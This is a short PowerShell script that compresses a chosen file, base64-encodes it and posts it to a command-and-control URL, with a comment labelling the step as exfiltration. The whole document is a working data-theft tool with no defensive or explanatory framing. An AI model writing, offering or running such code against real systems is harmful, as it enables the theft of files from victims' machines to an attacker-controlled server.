param (
    [string]$FilePath,
    [string]$C2Url
)

# Compress and encode the file
$compressedFilePath = "$FilePath.gz"
Compress-Archive -Path $FilePath -DestinationPath $compressedFilePath
$fileContent = [System.IO.File]::ReadAllBytes($compressedFilePath)
$encodedData = [System.Convert]::ToBase64String($fileContent)

# Exfiltrate the data
$payload = @{ file = $encodedData }
$response = Invoke-RestMethod -Uri $C2Url -Method Post -Body ($payload | ConvertTo-Json)
$response.StatusCode
